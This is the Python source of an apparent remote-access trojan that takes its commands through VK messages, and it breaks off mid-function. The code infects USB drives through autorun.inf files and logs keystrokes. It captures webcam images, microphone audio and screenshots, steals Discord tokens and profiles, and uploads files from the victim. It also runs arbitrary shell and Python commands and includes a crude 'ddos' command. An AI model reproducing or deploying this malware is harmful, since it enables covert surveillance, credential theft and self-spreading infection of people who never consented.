# -*- coding: utf-8 -*-
# pylint: disable=too-many-lines

"""
    Remote Access Tool
    Author: Kirill Zhosul.
    https://github.com/kirillzhosul/remote-access
"""

import typing
import json
import os
import os.path
import subprocess
import shutil 
import atexit
import sys
import multiprocessing
import re
import datetime

from . import fs
from .run_lock import RunLock
from .command_result import CommandResult
from .debug import DEBUG, message as debug_message
from .autorun import autorun_register, autorun_unregister
from .config import *

try:
    # TODO: Move at server setup (but for now there is no NON-VK server types.)
    import vk_api
    import vk_api.utils
    import vk_api.upload
    # There is vk_api.longpoll / vk_api.bot_longpoll imports in server connection,
    # As there is checks for current server type (to not cause import conflicts).

    import requests
except ImportError as exception:
    if DEBUG:
        print(f"[Importing] Cannot import {exception}!")
    sys.exit(1)

# Other.

# IP When can`t get.
DEFAULT_INVALID_IP = "0.0.0.0.0"

# HWID When can`t get.
DEFAULT_INVALID_HWID = "00000000-0000-0000-0000-000000000000"

# TAGS When can`t get.
DEFAULT_INVALID_TAGS = ["PC", "TAGS_LOADING_ERROR"]

# System OK code.
SYSTEM_OK_STATUS_CODE: int = 0

# Drives that we will skip when injecting drives.
DRIVES_INJECTION_SKIPPED = ("C", "D")

# Thread for drives watching.
THREAD_DRIVES_WATCHING: multiprocessing.Process = multiprocessing.Process()

# Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the app.
PLATFORMS_SUPPORTED = ("win32", "linux")

# Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
# and just showing debug message for the it.
PLATFORMS_DEVELOPMENT = ("linux",)

#FOLDER: str = "" # load_config()
CURRENT_DIRECTORY = os.getcwd()
KEYLOGGER_BUFFER: str = ""
OUT = None # `python` command output container.
VERSION = "[Pre-Release] 0.6"

# Commands (initialise_commands()).
COMMANDS_FUNCTIONS: typing.Dict[str, typing.Callable] = {}
COMMANDS_HELP: typing.Dict[str, typing.Tuple] = {}

# Settings.
CLIENT_NAME: str = "CLIENT_INITIALISATION_ERROR" # load_name()
CLIENT_TAGS: typing.List[str] = ["CLIENT_INITIALISATION_ERROR"] # load_tags()

# Server (server_connect()).
SERVER_API = None
SERVER_LONGPOLL = None

# Name.


def load_name() -> None:
    """ Loads name data. """

    global CLIENT_NAME

    try:
        path = get_folder() + get_config()["paths"]["name"]
        fs.build_path(path)

        if os.path.exists(path):
            try:
                with open(path, "r", encoding="UTF-8") as name_file:
                    CLIENT_NAME = str(name_file.read())
                return
            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                debug_message(f"[Name] Failed to load name! Exception - {exception}")

    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Name] Failed to load name! Exception - {exception}")

    CLIENT_NAME = get_ip()["ip"]
    save_name()

    debug_message("[Name] Name was set to default during loading (can`t read)")


def save_name() -> None:
    """ Saves name to the file. """

    try:
        path = get_folder() + get_config()["paths"]["name"]
        fs.build_path(path)

        with open(path, "w", encoding="UTF-8") as name_file:
            name_file.write(str(CLIENT_NAME))
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Name] Failed to read name! Exception - {exception}")


# Drives Injection.

def drive_inject_autorun_executable(drive: str) -> None:
    """ Injects autorun executable. """

    if not FEATURE_DRIVES_INJECTION_ENABLED:
        return

    try:
        if drive in DRIVES_INJECTION_SKIPPED:
            return

        # Code below copies running executable in secret folder,
        # And adds this executable in to drive autorun file.

        executable_path = "autorun\\autorun." + fs.executable_get_extension()

        if not os.path.exists(drive + executable_path):
            fs.build_path(drive + executable_path)
            shutil.copyfile(sys.argv[0], drive + executable_path)

            with open(drive + "autorun.inf", "w", encoding="UTF-8") as autorun_file:
                autorun_file.write(f"[AutoRun]\nopen={executable_path}\n\naction=Autorun\\Autorun")
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Drive Inject] Error when trying to inject drive! Exception - {exception}")


# Drives watching.

def drives_watching_thread() -> None:
    """ Thread function that do drives watching and also infecting it if enabled. """

    try:
        current_drives = fs.try_get_drives_list()

        while True:
            latest_drives = fs.try_get_drives_list()

            connected_drives = list_difference(latest_drives, current_drives)
            disconnected_drives = list_difference(current_drives, latest_drives)

            for drive in connected_drives:
                server_message(f"[Spreading] Connected drive {drive}!")
                debug_message(f"[Spreading] Connected drive {drive}!")
                drive_inject_autorun_executable(drive)

            for drive in disconnected_drives:
                server_message(f"[Spreading] Disconnected drive {drive}!")
                debug_message(f"[Spreading] Disconnected drive {drive}!")

            current_drives = fs.try_get_drives_list()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Drives Watching] Error when watching drives! Exception - {exception}")


def drives_waching_start() -> None:
    """ Starts drive watching. """

    if not FEATURE_DRIVES_WATCHING_ENABLED:
        return

    global THREAD_DRIVES_WATCHING
    THREAD_DRIVES_WATCHING = multiprocessing.Process(target=drives_watching_thread, args=())
    THREAD_DRIVES_WATCHING.start()

# Commands.


def command_screenshot(*_) -> CommandResult:
    """ Command `screenshot` that returns screenshot image. """

    try:
        import PIL.ImageGrab  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult("This command does not supported on selected PC! (Pillow module is not installed)")

    # Taking screenshot.
    screenshot = PIL.ImageGrab.grab()

    path = get_folder() + get_config()["paths"]["screenshot"]
    screenshot.save(path)

    result = CommandResult()
    result.from_attachment(path, "Screenshot", "photo")
    return result


def command_webcam(_arguments, _event) -> CommandResult:
    """ Command `webcam` that returns webcam photo. """

    try:
        import cv2  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult(
            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")

    camera = cv2.VideoCapture(0)
    _, image = camera.read()

    path = get_folder() + get_config()["paths"]["webcam"]
    fs.build_path(path)
    cv2.imwrite(path, image)

    del camera

    result = CommandResult()
    result.from_attachment(path, "Webcam", "photo")
    return result


def command_microphone(arguments, _) -> CommandResult:
    """ Command `microphone` that records voice and sends it. """

    try:
        import pyaudio  # pylint: disable=import-outside-toplevel
        import wave  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult("This command does not supported on selected PC! (pyaduio/wave module is not installed)")

    path = get_folder() + get_config()["paths"]["microphone"]

    try:
        record_microphone(path, int(arguments))
    except ValueError:
        record_microphone(path)


    result = CommandResult()
    result.from_attachment(path, "Microphone", "audio_message")
    return result


def command_download(arguments, _) -> CommandResult:
    """ Command `download` that downloads file from client."""

    # Get download path.
    path = arguments.replace("\"", "").replace("\'", "")

    if os.path.exists(path):
        if os.path.isfile(path):
            if fs.get_size(path) < 1536:
                result = CommandResult()
                result.from_attachment(path, os.path.basename(path), "doc")
                result.disable_delete_after_uploading()
                return result
            return CommandResult("Too big file to download! Maximal size for download: 1536MB (1.5GB)")
        
        if os.path.isdir(path):
            if fs.get_size(path) < 1536:
                return CommandResult("Directories downloading is not implemented yet!")
            return CommandResult("Too big directory to download! Maximal size for download: 1536MB(1.5GB)")
    else:
        if os.path.exists(get_folder() + path):
            return command_download(get_folder() + path, _)
    return CommandResult("Path that you want download does not exists")


def command_message(arguments: str, _) -> CommandResult:
    """ Command `message` that shows message. """

    try:
        import ctypes  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult("This command does not supported on selected PC! (ctypes module is not installed)")

    if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
        return CommandResult("Incorrect arguments! Example: text;title;style")

    # Calling message.
    try:
        # Trying to show message.

        # Arguments check ([text: str, title: str, type: int])
        message_parameters: typing.List[typing.Union[str, int]] = arguments_list

        # Process optional parameters.
        if len(arguments_list) <= 0:
            message_parameters.append("")  # Text.
        if len(arguments_list) <= 1:
            message_parameters.append("")  # Title.
        if len(arguments_list) <= 2:
            message_parameters.append(0)  # Type.

        # Convert type argument to integer.
        message_parameters[2] = int(message_parameters[2])

        # Creating thread.
        multiprocessing.Process(
            # First argument, is hWND. That is not required.
            target=ctypes.windll.user32.MessageBoxW,
            args=(0, *message_parameters)
        ).start()

    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        return CommandResult(f"Error when showing message! Error: {exception}")
    return CommandResult("Message was shown!")


def command_tags_new(arguments, _) -> CommandResult:
    """ Command `tags_new` that replaces tags. """

    if (arguments := arguments.split(";")) and len(arguments) == 0:
        # If no arguments.
        return CommandResult("Incorrect arguments! Example: (tags separated by ;)")

    # Tags that was added.
    new_tags = list({tag.replace(" ", "-") for tag in arguments})

    if len(new_tags) != 0:
        # If tags was added.

        global CLIENT_TAGS
        CLIENT_TAGS = new_tags
        save_tags()

        return CommandResult(f"Tags was replaced to: {';'.join(CLIENT_TAGS)}")
    return CommandResult("Tags replacing was not completed! No valid tags passed!")


def command_tags_add(arguments: str, _) -> CommandResult:
    """ Command `tags_add` that adds tags to current. """

    if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
        # If no arguments.
        return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")

    # Clean tags.
    tags = [tag.replace(" ", "-") for tag in arguments_list]

    # Add tags.
    CLIENT_TAGS.extend(tags)

    save_tags()
    return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(CLIENT_TAGS)}")


def command_help(arguments, _event) -> CommandResult:
    """ Command `help` that shows help for all commands. """

    # Getting arguments.
    arguments = arguments.split(";")

    if len(arguments) > 0 and arguments[0] != "":
        # If command given.

        # Getting command.
        command = arguments[0]

        if command not in COMMANDS_HELP:
            return CommandResult(f"Command {command} not exists!")

        # Help information.
        information, using = COMMANDS_HELP[command]

        # Returning information.
        return CommandResult(
            f"[{command}]:\n"
            f"* {information}\n"
            f"* (Use: {using})"
        )

    # Help string.
    help_string = ""

    for command, information in COMMANDS_HELP.items():
        # For all commands and they information.

        # Decompose information.
        information, using = information

        # Add data.
        help_string += f"[{command}]: \n" \
                       f"--{information}\n" \
                       f"-- (Use: {using})\n"

    # Returning.
    return CommandResult(help_string)


def command_properties(arguments, _) -> CommandResult:
    """ Command `properties` that returns properties of the file. """

    # Get download path.
    path = arguments.replace("\"", "").replace("\'", "")

    if os.path.exists(path):
        # If path exists.

        # Getting size.
        property_size = f"{fs.get_size(path)}MB"

        # Getting type.
        property_type = fs.get_type(path)

        # Getting time properties.
        property_created_at = datetime.date.fromtimestamp(os.path.getctime(path))
        property_accessed_at = datetime.date.fromtimestamp(os.path.getatime(path))
        property_modified_at = datetime.date.fromtimestamp(os.path.getmtime(path))

        # Returning properties.
        return CommandResult(
            f"Path: {path},\n"
            f"Size: {property_size},\n"
            f"Type: {property_type},\n"
            f"Modified: {property_modified_at},\n"
            f"Created: {property_created_at},\n"
            f"Accessed: {property_accessed_at}."
        )

    # If not exists.

    if os.path.exists(get_folder() + path):
        # Try relative.

        # Call for relative.
        return command_properties(get_folder() + path, _)

    return CommandResult("Path does not exists!")


def command_cd(arguments, _) -> CommandResult:
    """ Command `cd` that changes directory. """

    # Globalising current directory.
    global CURRENT_DIRECTORY

    # Get directory path.
    path = arguments

    # Remove trailing slash.
    if path.endswith("\\"):
        path = path[:-1]

    if path.startswith(".."):
        # If go up.

        # Get directory elements.
        path_directories = CURRENT_DIRECTORY.split("\\")

        if len(path_directories) == 1:
            # If last (like C:\\)

            # Error.
            return CommandResult("Already in root! Directory: " + CURRENT_DIRECTORY)

        # Remove last.
        path_directories.pop(-1)

        if len(path_directories) <= 1:
            # If last (like C:\\)

            # Valid.
            path_directories.append("")

        # Pass path to next cd command.
        path = "\\".join(path_directories)
        return command_cd(path, _)

    if os.path.exists(CURRENT_DIRECTORY + "\\" + path):
        # If this is local folder.

        if not os.path.isdir(CURRENT_DIRECTORY + "\\" + path):
            # If not directory.
            return CommandResult("Can`t change directory to the filename")

        # Changing.
        CURRENT_DIRECTORY += "\\" + path

        return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")

    # If not local path.
    if os.path.exists(path):
        # If path exists - moving there.

        if not os.path.isdir(path):
            # If not directory.
            return CommandResult("Can`t change directory to the filename")

        if path == "":
            # If no arguments.
            return CommandResult(f"Current directory - {CURRENT_DIRECTORY}")

        # Changing.
        CURRENT_DIRECTORY = path

        return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")

    return CommandResult(f"Directory {path} does not exists!")


def command_location(*_) -> CommandResult:
    """ Command `location` that returns location based on IP. """

    # Getting ip data.
    ip_data = get_ip()

    if all(key in ip_data for key in ("ip", "city", "country", "region", "org")):
        # If all required fields exists.

        # Getting ip data.
        address = ip_data["ip"]
        city = ip_data["city"]
        country = ip_data["country"]
        region = ip_data["region"]
        provider = ip_data["org"]

        # Returning.
        return CommandResult(
            f"IP: {address},\n"
            f"Country: {country},\n"
            f"Region: {region},\n"
            f"City: {city},\n"
            f"Provider: {provider}."
        )

    # Error.
    return CommandResult("Couldn't get location from IP data")


def command_name_new(arguments, _) -> CommandResult:
    """ Сommand `name_new` that changes name to other."""

    # Global name.
    global CLIENT_NAME

    if len(arguments) > 0:
        # If correct arguments.

        # Changing name.
        CLIENT_NAME = arguments

        # Saving name
        save_name()

        # Returning.
        return CommandResult(f"Name was changed to {CLIENT_NAME}")

    # Returning.
    return CommandResult("Invalid new name!")


def command_discord_profile_raw(*_) -> CommandResult:
    """ Сommand "discord_profile_raw" that returns information about discord found in system (as raw dict). """

    # Grab tokens.
    tokens = stealer_steal_discord_tokens()

    if len(tokens) == 0:
        # If not found any tokens.

        # Error.
        return CommandResult("Discord tokens not found in system!")

    # Get profile.
    profile = stealer_steal_discord_profile(tokens)

    # Returning.
    if profile:
        return CommandResult(json.dumps(profile, indent=2))

    # Error.
    return CommandResult("Discord profile not found (Failed to load)")


def command_ddos(arguments, _) -> CommandResult:
    """ Command `ddos` that start ddos. """

    # Getting arguments.
    arguments = arguments.split(";")

    if len(arguments) >= 1:
        # If arguments OK.

        # Get address.
        address = arguments[0]

        if len(arguments) > 2 and arguments[2] == "admin":
            # If admin.

            # Get timeout.
            timeout = arguments[1]

            # Pinging from admin.
            console_response = os.system(f"ping -c {address} {timeout}")

            if console_response == SYSTEM_OK_STATUS_CODE:
                return CommandResult("Completed DDoS (Admin)")

            return CommandResult(f"DDoS ping returned non-zero exit code {console_response}! (Admin) (Access Denied?)")

        # Pinging from user.
        console_response = os.system(f"ping {address}")

        if console_response == SYSTEM_OK_STATUS_CODE:
            return CommandResult("Completed DDoS (User)")

        return CommandResult(f"DDoS ping returned non-zero status {console_response}! (User)")

    return CommandResult("DDoS incorrect arguments! Example: address;time;admin or address")


def command_ls(arguments, _) -> CommandResult:
    """ Command `ls` that lists all files in the directory. """

    # Get directory.
    directory_path = arguments if arguments != "" else CURRENT_DIRECTORY

    # Get files.
    directory_list = fs.try_listdir(directory_path)
    directory_items = ",\n".join([
        ("[D] " + path if os.path.isdir(directory_path + "\\" + path) else "[F] " + path) for path in directory_list
    ]) if directory_list else "Empty (Or error)!"

    # Returning.
    return CommandResult(f"Directory `{directory_path}`:\n" + directory_items)


def command_link(arguments, _) -> CommandResult:
    """ Command `link` that opens link."""

    # Get arguments.
    arguments = arguments.split(";")

    # Open with module or not.
    native = False
    if len(arguments) > 1 and arguments[1] == "native":
        native = True

    if not native:
        # If not native mode .

        try:
            # Trying to open with the module.
            import webbrowser  # noqa, pylint: disable=import-outside-toplevel
            webbrowser.open(arguments[0])
            return CommandResult("Link was opened (Via module)!")
        except ImportError:
            pass

    # Opening with system.
    console_response = os.system(f"start {arguments[0]}")

    if console_response == SYSTEM_OK_STATUS_CODE:
        return CommandResult("Link was opened (Via system, native)!")
    return CommandResult(f"Link was not opened! (Non-zero exit code {console_response})")


def command_drives(*_) -> CommandResult:
    """ Command `drives` that returns list of all drives in the system. """
    return CommandResult("Drives: \n" + "Drive: ,\n".join(fs.try_get_drives_list()))


def command_discord_tokens(*_) -> CommandResult:
    """ Command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma). """

    tokens = stealer_steal_discord_tokens()
    if len(tokens) == 0:
        return CommandResult("Discord tokens was not found in system!")

    return CommandResult("Discord tokens:\n" + ",\n".join(tokens))


def command_taskkill(arguments, _) -> CommandResult:
    """ Command `taskkill` that kills task. """

    console_response = os.system(f"taskkill /F /IM {arguments}")
    if console_response == SYSTEM_OK_STATUS_CODE:
        return CommandResult("Task successfully killed!")

    return CommandResult(f"Unable to kill task, there is some error? (Non-zero exit code {console_response})")


def command_upload(*_) -> CommandResult:
    """ Command `upload` that uploads file to the client. """
    return CommandResult("Not implemented yet!")


def command_python(arguments, _) -> CommandResult:
    """ Command `python` that executes python code. """

    global OUT  # pylint: disable=global-variable-not-assigned
    OUT = None

    python_source_code = arguments.\
        replace("&gt;", ">").\
        replace("&lt;", "<").\
        replace("&quot;", "'").\
        replace("&tab", "   ")

    try:
        exec(python_source_code, globals(), None)  # pylint: disable=exec-used
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        return CommandResult(f"Python code execution exception: {exception}")

    if OUT is not None:
        try:
            return CommandResult(str(OUT))
        except NameError:
            pass

    return CommandResult("Python code does not return output! Write in OUT variable.")


def command_tags(*_) -> CommandResult:
    """ Command tags that returns tags list. """
    return CommandResult(str("Tag: ,\n".join(CLIENT_TAGS)))


def command_version(*_) -> CommandResult:
    """ Command `version` that returns version """
    return CommandResult(VERSION)


def command_discord_profile(*_) -> CommandResult:
    """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""

    tokens = stealer_steal_discord_tokens()

    if len(tokens) == 0:
        return CommandResult("Discord tokens was not found in system!")

    profile = stealer_steal_discord_profile(tokens)

    if profile:
        if avatar := None and ("avatar" in profile and profile["avatar"]):
            # TODO: Why there is some of IDs?.
            avatar = "\n\n" + f"https://cdn.discordapp.com/avatars/636928558203273216/{profile['avatar']}.png"
        return CommandResult(
            f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" +
            avatar if avatar else ""
        )

    return CommandResult("Failed to get Discord profile!")


def command_exit(*_) -> CommandResult:
    """ Command `exit` that exists app. """

    # If you don`t terminate, there is some unexpected behavior.
    if isinstance(THREAD_DRIVES_WATCHING, multiprocessing.Process):
        THREAD_DRIVES_WATCHING.terminate()
    
    sys.exit(0)
    return CommandResult("Exiting...")  # noqa


def command_shutdown(*_) -> CommandResult:
    """ Command `shutdown` that shutdown system. """

    os.system("shutdown /s /t 0")
    return CommandResult("Shutdowning system (`shutdown /s /t 0`)...")


def command_alive(*_) -> CommandResult:
    """ Command `alive` that show current time. """

    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    return CommandResult(f"Alive! Time: {current_time}")


def command_destruct(*_) -> CommandResult:
    """ Command `destruct` that deletes self from system. """

    autorun_unregister()

    fs.try_delete(get_folder() + "lock")
    fs.try_delete(get_folder() + get_config()["paths"]["tags"])
    fs.try_delete(get_folder() + get_config()["paths"]["name"])
    fs.try_delete(get_folder() + get_config()["paths"]["log"])
    fs.try_delete(get_folder() + get_config()["paths"]["anchor"])
    fs.try_delete(get_folder() + get_config()["paths"]["screenshot"])
    fs.try_delete(get_folder() + get_config()["paths"]["microphone"])
    fs.try_delete(get_folder() + get_config()["paths"]["webcam"])
    fs.try_delete(get_folder() + get_config()["autorun"]["executable"])
    fs.try_delete(get_folder())

    return command_exit(*_)


def command_keylog(*_) -> CommandResult:
    """ Command `keylog` that shows current keylog buffer."""

    if not FEATURE_KEYLOGGER_ENABLED:
        return CommandResult("Keylogger is disabled!")

    return CommandResult(KEYLOGGER_BUFFER)


def command_restart(*_) -> CommandResult:
    """ Command `restart` that restarts system. """
    os.system("shutdown /r /t 0")
    return CommandResult("Restarting system (`shutdown /r /t 0`)...")


def command_console(arguments, _) -> CommandResult:
    """ Command `console` that executing console. """
    console_response = os.system(arguments)
    if console_response == SYSTEM_OK_STATUS_CODE:
        return CommandResult(f"Console status code: OK (Exit code {console_response})")

    return CommandResult(f"Console status code: ERROR (Non-zero exit code {console_response})")


# Client.

def execute_command(command_name: str, arguments: str, event) -> CommandResult:
    """ Function that executes command and return it result. """
    for command, function in COMMANDS_FUNCTIONS.items():
        if command_name == command:
            result: CommandResult = function(arguments, event)
            return result
    return CommandResult(f"Invalid command {command_name}! Write `help` command to get all commands!")


def process_message(event) -> None:
    """ Processes message from the server. """

    message = event
    if get_config()["server"]["type"] == "VK_GROUP":
        message = message.message

    answer_text: str = "Void... (No response)"
    answer_attachment = None

    try:
        arguments = message.text.split(";")

        if len(arguments) == 0:
            return

        tags = arguments.pop(0)

        if tags == "alive":
            if peer_is_allowed(message.peer_id):
                answer_text = command_alive("", event).get_text()
            else:
                answer_text = "Sorry, but you don't have required permissions to call this command!"
        else:
            if list_intersects(parse_tags(tags), CLIENT_TAGS):
                if peer_is_allowed(message.peer_id):
                    if len(arguments) == 0:
                        answer_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
                    else:
                        command = str(arguments.pop(0)).lower().replace(" ", "")
                        command_arguments = ";".join(arguments)
                        command_result: CommandResult = execute_command(command, command_arguments, event)
                        command_result_attachment = command_result.get_attachment()

                        if command_result_attachment is not None:
                            uploading_path, uploading_title, uploading_type = command_result_attachment

                            if uploading_type == "photo":
                                uploading_status, uploading_result = \
                                    server_upload_photo(uploading_path)

                                if uploading_status:
                                    answer_text = uploading_title
                                    answer_attachment = uploading_result
                                else:
                                    answer_text = f"Error when uploading photo. Result - {uploading_result}"
                            elif uploading_type in ("doc", "audio_message"):
                                uploading_status, uploading_result = \
                                    server_upload_document(uploading_path, uploading_title,
                                                           message.peer_id, uploading_type)

                                if uploading_status:
                                    answer_text = uploading_title
                                    answer_attachment = uploading_result
                                else:
                                    answer_text = f"Error when uploading document with type `{uploading_type}`. " \
                                                  f"Result - {uploading_result}"

                            if get_config()["settings"]["delete_file_after_uploading"] and \
                                    command_result.should_delete_after_uploading():
                                fs.try_delete(uploading_path)
                        else:
                            answer_text = command_result.get_text()
                else:
                    answer_text = "Sorry, but you don't have required permissions to make this command!"
            else:
                return
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        answer_text = f"Failed to process message answer. Exception - {exception}"

    if answer_text or answer_attachment:
        server_message(answer_text, answer_attachment, message.peer_id)


# Debug.


# Keylogger.

def keylogger_start() -> None:
    """ Starts keylogger (Add keyboard callback). """

    if not FEATURE_KEYLOGGER_ENABLED:
        debug_message("[Keylogger] Not starting, as disabled...")
        return

    try:
        import keyboard  # pylint: disable=import-outside-toplevel
    except ImportError:
        debug_message("[Keylogger] Can`t start as there is no required module with name \"keyboard\"!")
        return

    keyboard.on_release(callback=keylogger_callback_event)
    debug_message("[Keylogger] Registered callback event...")

    debug_message("[Keylogger] Started!")


def keylogger_callback_event(keyboard_event):
    """ Process keyboard callback event for keylloger. """

    try:
        keyboard_key = str(keyboard_event.name)

        global KEYLOGGER_BUFFER
        if isinstance(keyboard_key, str):
            if len(keyboard_key) > 1:
                if keyboard_key == "space":
                    KEYLOGGER_BUFFER = " "
                elif keyboard_key == "enter":
                    KEYLOGGER_BUFFER = "\n"
                elif keyboard_key == "decimal":
                    KEYLOGGER_BUFFER = "."
                elif keyboard_key == "backspace":
                    KEYLOGGER_BUFFER = KEYLOGGER_BUFFER[:-1]
                else:
                    keyboard_key = keyboard_key.replace(" ", "_").upper()
                    KEYLOGGER_BUFFER = f"[{keyboard_key}]"
            else:
                KEYLOGGER_BUFFER += keyboard_key
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Keylogger] Failed to process keyboard event! Exception - {exception}")


# Server.

def server_connect() -> None:
    """ Connects to the server. """

    global SERVER_API
    global SERVER_LONGPOLL

    try:
        if "server" not in get_config() or "type" not in get_config()["server"]:
            debug_message("[Server] Failed to get configuration server->type value key! "
                          "Please check configuration file!")
            sys.exit(1)

        server_type = get_config()["server"]["type"]

        if server_type in ("VK_USER", "VK_GROUP"):
            access_token = get_config()["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]


            try:
                if server_type == "VK_GROUP":
                    import vk_api.bot_longpoll  # pylint: disable=import-outside-toplevel, redefined-outer-name
                else:
                    import vk_api.longpoll  # pylint: disable=import-outside-toplevel, redefined-outer-name
            except ImportError:
                debug_message("[Server] Failed to import VK longpoll!")
                sys.exit(1)

            SERVER_API = vk_api.VkApi(token=access_token)

            if server_type == "VK_GROUP":
                group_index = get_config()["server"]["vk"]["group"]["index"]
                SERVER_LONGPOLL = vk_api.bot_longpoll.VkBotLongPoll(SERVER_API, group_index)
            else:
                SERVER_LONGPOLL = vk_api.longpoll.VkLongPoll(SERVER_API)
        else:
            debug_message(f"[Server] Failed to connect with current server type, "
                          f"as it may be not implemented / exists. Server type - {server_type}")
            sys.exit(1)
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Server] Failed to connect with server! Exception - {exception}")
        sys.exit(1)

    debug_message(f"[Server] Connected to the server with type - {server_type}")


def server_listen() -> None:
    """ Listen server for new messages. """

    if SERVER_LONGPOLL is None:
        debug_message("[Server] Failed to start server listening as server longpoll is not connected!")
        sys.exit(1)

    if "server" not in get_config() or "type" not in get_config()["server"]:
        debug_message("[Server] Failed to get configuration server->type value key! Please check configuration file!")
        sys.exit(1)

    server_type = get_config()["server"]["type"]
    if server_type in ("VK_USER", "VK_GROUP"):
        while True:
            try:
                if server_type == "VK_USER":
                    message_event = vk_api.longpoll.VkEventType.MESSAGE_NEW  # noqa
                elif server_type == "VK_GROUP":
                    message_event = vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW  # noqa
                else:
                    debug_message(f"[Server] Failed to start server listening with current server type, "
                                  f"as it may be not implemented / exists. Server type - {server_type}")
                    return

                for event in SERVER_LONGPOLL.listen():  # noqa
                    if event.type == message_event:
                        process_message(event)

            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                debug_message(f"[Server] Failed to listen server. Exception - {exception}")
    else:
        debug_message(f"[Server] Failed to listen with current server type, as it may be not implemented / exists. "
                      f"Server type - {server_type}")
        sys.exit(1)


def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typing.Optional[typing.Any]:
    """ Calls server method. """

    if SERVER_API is None:
        return None

    try:
        if "random_id" not in parameters:
            parameters["random_id"] = vk_api.utils.get_random_id()
        return SERVER_API.method(method, parameters)  # noqa
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Server] Error when trying to call server method (API)! Exception - {exception}")

        retry_on_fail = get_config()["server"]["vk"]["retry_method_on_fail"]

        if is_retry or not retry_on_fail:
            return None

        return server_method(method, parameters, True)


def server_message(text: str, attachmment: typing.Optional[str] = None, peer: typing.Optional[str] = None) -> None:
    """ Sends mesage to the server. """

    if peer is None:
        for config_peer in get_config()["server"]["vk"]["peers"]:
            server_message(text, attachmment, config_peer)
        return

    _text = f"<{CLIENT_NAME}>\n{text}"

    debug_message("[Server] Sent new message!")

    server_method("messages.send", {
        "message": _text,
        "attachment": attachmment,
        "peer_id": peer
    })


def server_upload_photo(path: str) -> typing.Tuple[bool, str]:
    """ Uploads photo to the server. """

    server_uploader = vk_api.upload.VkUpload(SERVER_API)
    photo, *_ = server_uploader.photo_messages(path)

    if all(key in photo for key in ("owner_id", "id", "access_key")):
        owner_id = photo["owner_id"]
        photo_id = photo["id"]
        access_key = photo["access_key"]
        return True, f"photo{owner_id}_{photo_id}_{access_key}"

    return False, ""


def server_upload_document(path: str, title: str, peer: int, document_type: str = "doc") -> \
        typing.Tuple[bool, typing.Union[str, typing.Any]]:
    """ Uploads document to the server and returns it (as document string). """

    try:
        server_docs_api = SERVER_API.get_api().docs # noqa

        if "upload_url" in (upload_server := server_docs_api.getMessagesUploadServer(type=document_type, peer_id=peer)):
            upload_url = upload_server["upload_url"]
        else:
            return False, "Upload Server Error" + str(upload_server)

        request = json.loads(requests.post(upload_url, files={
            "file": open(path, "rb")
        }).text)

        if "file" in request:
            request = server_docs_api.save(file=request["file"], title=title, tags=[])
            document_id = request[document_type]["id"]
            document_owner_id = request[document_type]["owner_id"]
            return True, f"doc{document_owner_id}_{document_id}"

        debug_message(f"[Server] Error when uploading document (Request)! Request - {request}")
        return False, "Request Error" + str(request)
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"Error when uploading document (Exception)! Exception: {exception}")
        return False, "Exception Error" + str(exception)


# Tags.

def get_default_tags() -> typing.List:
    """ Returns default tags. """

    default_tags = [get_ip()["ip"], get_operating_system(), "PC"]

    if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
        default_tags.append(get_hwid())

    return default_tags


def reset_tags() -> None:
    """ Resets tags. """

    global CLIENT_TAGS
    CLIENT_TAGS = get_default_tags()
    save_tags()


def load_tags() -> None:
    """ Loads all tags data. """

    global CLIENT_TAGS

    try:
        path = get_folder() + get_config()["paths"]["tags"]
        fs.build_path(path)

        if os.path.exists(path):
            try:
                with open(path, "r", encoding="UTF-8") as tags_file:
                    CLIENT_TAGS = json.loads(tags_file.read())["tags"]
            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                debug_message(f"[Tags] Failed to load tags file, resetting tags! Exception: {exception}")
                reset_tags()
        else:
            debug_message("[Tags] Not found tags file, resetting to default!")
            reset_tags()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Tags] Failed to load tags, set tags to error! Exception - {exception}")
        CLIENT_TAGS = DEFAULT_INVALID_TAGS


def parse_tags(tags: str) -> typing.List:
    """ Parse tags for command calling. """
    return tags.replace("[", "").replace("]", "").split(",")


def save_tags() -> None:
    """ Saves tags to the file. """

    try:
        debug_message("[Tags] Saving tags to the file...")

        path = get_folder() + get_config()["paths"]["tags"]
        fs.build_path(path)

        with open(path, "w", encoding="UTF-8") as tags_file:
